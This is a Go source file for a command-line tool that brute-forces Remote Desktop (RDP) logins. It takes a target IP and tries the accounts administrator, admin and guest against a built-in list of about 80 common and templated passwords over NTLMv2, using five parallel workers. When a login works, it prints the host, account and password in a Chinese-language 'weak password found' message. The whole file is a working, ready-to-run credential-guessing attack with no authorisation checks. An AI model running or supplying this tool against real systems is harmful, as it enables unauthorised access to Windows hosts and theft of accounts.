package main

import (
	"errors"
	"flag"
	"fmt"
	"github.com/tomatome/grdp/core"
	"github.com/tomatome/grdp/glog"
	"github.com/tomatome/grdp/protocol/nla"
	"github.com/tomatome/grdp/protocol/pdu"
	"github.com/tomatome/grdp/protocol/rfb"
	"github.com/tomatome/grdp/protocol/sec"
	"github.com/tomatome/grdp/protocol/t125"
	"github.com/tomatome/grdp/protocol/tpkt"
	"github.com/tomatome/grdp/protocol/x224"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type HostInfo struct {
	Host  string
	Ports string
}

var (
	IsBrute     = false
	BruteThread = 5
	Timeout     = int64(6)
	Domain      = ""
	Userdict    = map[string][]string{"rdp": {"administrator", "admin", "guest"}}
	Passwords   = []string{"123456", "admin", "", "admin123", "root", "pass123", "pass@123", "password", "123123", "654321", "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111", "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@123#4", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ", "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Aa123456789", "{user}@2019", "{user}@2020", "{user}@2021", "{user}@2022", "{user}@2023", "{user}@2024", "{user}@2025"}
)

func LogResult(msg string) {
	fmt.Println(msg)
	os.Exit(0)
}

type Brutelist struct {
	user string
	pass string
}

func main() {
	ip := flag.String("h", "", "Target IP address")
	port := flag.Int("p", 3389, "Target port")
	flag.Parse()

	if *ip == "" {
		fmt.Println("IP address is required")
		return
	}

	info := &HostInfo{
		Host:  *ip,
		Ports: strconv.Itoa(*port),
	}
	RdpScan(info)
}

func RdpScan(info *HostInfo) {
	var wg sync.WaitGroup
	var found = false
	brlist := make(chan Brutelist)
	port, _ := strconv.Atoi(info.Ports)

	for i := 0; i < BruteThread; i++ {
		wg.Add(1)
		go worker(info.Host, Domain, port, &wg, brlist, &found, Timeout)
	}

	go func() {
		for _, user := range Userdict["rdp"] {
			for _, pass := range Passwords {
				pass = strings.Replace(pass, "{user}", user, -1)
				brlist <- Brutelist{user, pass}
			}
		}
		close(brlist)
	}()

	wg.Wait()

	if !found {
		LogResult("[-] None")
	}
}

func worker(host, domain string, port int, wg *sync.WaitGroup, brlist chan Brutelist, found *bool, timeout int64) {
	defer wg.Done()
	for one := range brlist {
		if *found {
			return
		}
		user, pass := one.user, one.pass
		flag, err := RdpConn(host, domain, user, pass, port, timeout)
		if flag && err == nil {
			var result string
			if domain != "" {
				result = fmt.Sprintf("[+] 发现RDP弱口令\nRDP: %v:%v\n账号: %v\\%v\n密码: %v", host, port, domain, user, pass)
			} else {
				result = fmt.Sprintf("[+] 发现RDP弱口令\nRDP: %v:%v\n账号: %v\n密码: %v", host, port, user, pass)
			}
			*found = true
			LogResult(result)
			return
		}
	}
}

func RdpConn(ip, domain, user, password string, port int, timeout int64) (bool, error) {
	target := fmt.Sprintf("%s:%d", ip, port)
	g := NewClient(target, glog.NONE)
	err := g.Login(domain, user, password, timeout)

	if err == nil {
		return true, nil
	}

	return false, err
}

type Client struct {
	Host string
	tpkt *tpkt.TPKT
	x224 *x224.X224
	mcs  *t125.MCSClient
	sec  *sec.Client
	pdu  *pdu.Client
	vnc  *rfb.RFB
}

func NewClient(host string, logLevel glog.LEVEL) *Client {
	glog.SetLevel(logLevel)
	logger := log.New(os.Stdout, "", 0)
	glog.SetLogger(logger)
	return &Client{
		Host: host,
	}
}

func (g *Client) Login(domain, user, pwd string, timeout int64) error {
	conn, err := WrapperTcpWithTimeout("tcp", g.Host, time.Duration(timeout)*time.Second)
	if err != nil {
		return fmt.Errorf("[dial err] %v", err)
	}
	defer conn.Close()

	g.tpkt = tpkt.New(core.NewSocketLayer(conn), nla.NewNTLMv2(domain, user, pwd))
	g.x224 = x224.New(g.tpkt)
	g.mcs = t125.NewMCSClient(g.x224)
	g.sec = sec.NewClient(g.mcs)
	g.pdu = pdu.NewClient(g.sec)

	g.sec.SetUser(user)
	g.sec.SetPwd(pwd)
	g.sec.SetDomain(domain)

	g.tpkt.SetFastPathListener(g.sec)
	g.sec.SetFastPathListener(g.pdu)
	g.pdu.SetFastPathSender(g.tpkt)

	err = g.x224.Connect()
	if err != nil {
		return fmt.Errorf("[x224 connect err] %v", err)
	}

	wg := &sync.WaitGroup{}
	breakFlag := false
	wg.Add(1)

	g.pdu.On("error", func(e error) {
		err = e
		g.pdu.Emit("done")
	})
	g.pdu.On("close", func() {
		err = errors.New("close")
		g.pdu.Emit("done")
	})
	g.pdu.On("success", func() {
		err = nil
		g.pdu.Emit("done")
	})
	g.pdu.On("ready", func() {
		g.pdu.Emit("done")
	})
	g.pdu.On("done", func() {
		if !breakFlag {
			breakFlag = true
			wg.Done()
		}
	})
	wg.Wait()
	return err
}

func WrapperTcpWithTimeout(network, address string, timeout time.Duration) (net.Conn, error) {
	return net.DialTimeout(network, address, timeout)
}
